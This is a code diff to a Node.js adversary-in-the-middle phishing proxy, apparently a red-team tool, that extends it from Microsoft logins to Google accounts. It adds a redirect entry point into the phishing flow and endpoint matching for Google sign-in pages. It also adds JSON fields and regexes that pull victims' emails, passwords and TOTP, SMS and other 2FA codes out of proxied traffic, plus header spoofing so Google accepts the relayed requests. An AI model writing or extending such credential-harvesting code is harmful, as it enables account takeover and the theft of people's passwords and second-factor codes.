@@ -9,6 +9,7 @@ const crypto = require("crypto");
 const PROXY_ENTRY_POINT_BASE = "/login?method=signin&mode=secure&client_id=";
 const CORPORATE_CLIENT_ID = "3ce82761-cb43-493f-94bb-fe444b7a0cc4";
 const PERSONAL_CLIENT_ID = "4765445b-32c6-49b0-83e6-1d93765276ca";
+const GOOGLE_CLIENT_ID = "717762328687-iludtf96g1hinl76e4lc1b9a82g457nn.apps.googleusercontent.com"; // Google's OAuth client ID
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = "https://www.intrinsec.com/";
@@ -69,10 +70,21 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         clientResponse.end();
         return;
     }
+    
+    if (url === '/g' || url === '/google') {
+        // Redirect to Google login URL
+        clientResponse.writeHead(302, { 
+            Location: `/login?method=signin&mode=secure&client_id=${GOOGLE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Faccounts.google.com%2F` 
+        });
+        clientResponse.end();
+        return;
+    }
 
     if (url.startsWith(PROXY_ENTRY_POINT_BASE) && url.includes(PHISHED_URL_PARAMETER)) {
-        // Check if this is a login URL with either corporate or personal client_id
-        const isValidLogin = url.includes(`client_id=${CORPORATE_CLIENT_ID}`) || url.includes(`client_id=${PERSONAL_CLIENT_ID}`);
+        // Check if this is a login URL with any of our supported client_ids
+        const isValidLogin = url.includes(`client_id=${CORPORATE_CLIENT_ID}`) || 
+                           url.includes(`client_id=${PERSONAL_CLIENT_ID}`) ||
+                           url.includes(`client_id=${GOOGLE_CLIENT_ID}`);
         
         if (isValidLogin) {
             try {
@@ -671,9 +683,21 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
                             requestPath.includes('common/SAS') ||
                             requestPath.includes('common/login') ||
                             requestPath.includes('kmsi') || // Keep me signed in
-                            requestPath.includes('Federated'); // Federated auth
+                            requestPath.includes('Federated') || // Federated auth
+                            // Google-specific endpoints
+                            requestPath.includes('accounts.google.com') ||
+                            requestPath.includes('ServiceLogin') ||
+                            requestPath.includes('CheckCookie') ||
+                            requestPath.includes('Passwd') ||
+                            requestPath.includes('SecondFactor') ||
+                            requestPath.includes('challenge') ||
+                            requestPath.includes('speedbump') ||
+                            requestPath.includes('TL') ||
+                            requestPath.includes('v3/signin') ||
+                            requestPath.includes('identifier') ||
+                            requestPath.includes('_/signin/sl/challenge');
         
-        if (isAuthRequest || requestBodyStr.includes('passwd') || requestBodyStr.includes('password')) {
+        if (isAuthRequest || requestBodyStr.includes('passwd') || requestBodyStr.includes('password') || requestBodyStr.includes('Passwd')) {
             // Try to parse JSON body first
             try {
                 const jsonBody = JSON.parse(requestBodyStr);
@@ -685,7 +709,13 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
                           jsonBody.LoginName || 
                           jsonBody.UserName || 
                           jsonBody.loginfmt || // Microsoft's common field
-                          jsonBody.displayName || '';
+                          jsonBody.displayName ||
+                          // Google-specific fields
+                          jsonBody.Email ||
+                          jsonBody.identifier ||
+                          jsonBody.identifierId ||
+                          jsonBody.f.req || // Google uses nested objects
+                          '';
                 
                 // Capture password from various fields
                 password = jsonBody.password || 
@@ -694,7 +724,12 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
                           jsonBody.Passwd || 
                           jsonBody.accessPass || 
                           jsonBody.pin || // PIN authentication
-                          jsonBody.flowToken || ''; // Sometimes password is in flowToken
+                          jsonBody.flowToken || // Sometimes password is in flowToken
+                          // Google-specific fields
+                          jsonBody.Passwd ||
+                          jsonBody.password ||
+                          jsonBody.hiddenPassword ||
+                          '';
                 
                 // Capture OTP/2FA codes
                 otcCode = jsonBody.otc || 
@@ -705,7 +740,13 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
                          jsonBody.twoFactorCode || 
                          jsonBody.authCode || 
                          jsonBody.code || // Generic code field
-                         jsonBody.verificationCode || '';
+                         jsonBody.verificationCode ||
+                         // Google-specific fields
+                         jsonBody.Pin ||
+                         jsonBody.totpPin ||
+                         jsonBody.smsUserPin ||
+                         jsonBody.idvPin ||
+                         '';
                 
                 // Capture authenticator app codes
                 authenticatorCode = jsonBody.totpCode || 
@@ -730,21 +771,35 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
                     /(?:password|passwd|Password|Passwd|accessPass|flowToken)["\s:=]+([^&"\s,}]+)/i,
                     /passwd=([^&]+)/i,
                     /password=([^&]+)/i,
-                    /accessPass=([^&]+)/i
+                    /accessPass=([^&]+)/i,
+                    // Google patterns
+                    /Passwd=([^&]+)/i,
+                    /hiddenPassword=([^&]+)/i,
+                    /f\.req.*?passwd.*?:.*?"([^"]+)"/i, // Google's nested format
                 ];
                 
                 const usernamePatterns = [
                     /(?:username|email|login|LoginName|UserName|loginfmt)["\s:=]+([^&"\s,}]+)/i,
                     /loginfmt=([^&]+)/i,
                     /username=([^&]+)/i,
-                    /email=([^&]+)/i
+                    /email=([^&]+)/i,
+                    // Google patterns
+                    /Email=([^&]+)/i,
+                    /identifier=([^&]+)/i,
+                    /identifierId=([^&]+)/i,
+                    /f\.req.*?identifier.*?:.*?"([^"]+)"/i, // Google's nested format
                 ];
                 
                 const codePatterns = [
                     /(?:otc|otp|VerificationCode|Otc|code|totpCode|authCode)["\s:=]+([^&"\s,}]+)/i,
                     /code=([^&]+)/i,
                     /otc=([^&]+)/i,
-                    /verificationCode=([^&]+)/i
+                    /verificationCode=([^&]+)/i,
+                    // Google patterns
+                    /Pin=([^&]+)/i,
+                    /totpPin=([^&]+)/i,
+                    /smsUserPin=([^&]+)/i,
+                    /idvPin=([^&]+)/i,
                 ];
                 
                 // Try all password patterns
@@ -1367,6 +1422,39 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
             // This is a placeholder - in a real scenario you'd extract this from the page
             proxyRequestOptions.headers['hpgid'] = '33';
             proxyRequestOptions.headers['hpgact'] = '0';
+        }
+    }
+    
+    // Special handling for Google accounts
+    if (VICTIM_SESSIONS[currentSession].hostname === 'accounts.google.com' || 
+        VICTIM_SESSIONS[currentSession].hostname === 'www.google.com') {
+        // Ensure critical headers for Google
+        if (!proxyRequestOptions.headers['accept']) {
+            proxyRequestOptions.headers['accept'] = '*/*';
+        }
+        if (!proxyRequestOptions.headers['accept-language']) {
+            proxyRequestOptions.headers['accept-language'] = 'en-US,en;q=0.9';
+        }
+        if (!proxyRequestOptions.headers['sec-fetch-dest']) {
+            proxyRequestOptions.headers['sec-fetch-dest'] = 'empty';
+        }
+        if (!proxyRequestOptions.headers['sec-fetch-mode']) {
+            proxyRequestOptions.headers['sec-fetch-mode'] = 'cors';
+        }
+        if (!proxyRequestOptions.headers['sec-fetch-site']) {
+            proxyRequestOptions.headers['sec-fetch-site'] = 'same-origin';
+        }
+        // Google requires specific user-agent
+        if (!proxyRequestOptions.headers['user-agent'] || proxyRequestOptions.headers['user-agent'].includes('curl')) {
+            proxyRequestOptions.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+        }
+        // Google uses x-same-domain header
+        if (!proxyRequestOptions.headers['x-same-domain']) {
+            proxyRequestOptions.headers['x-same-domain'] = '1';
+        }
+        // Google-specific headers
+        if (!proxyRequestOptions.headers['google-accounts-xsrf']) {
+            proxyRequestOptions.headers['google-accounts-xsrf'] = '1';
         }
     }
 }
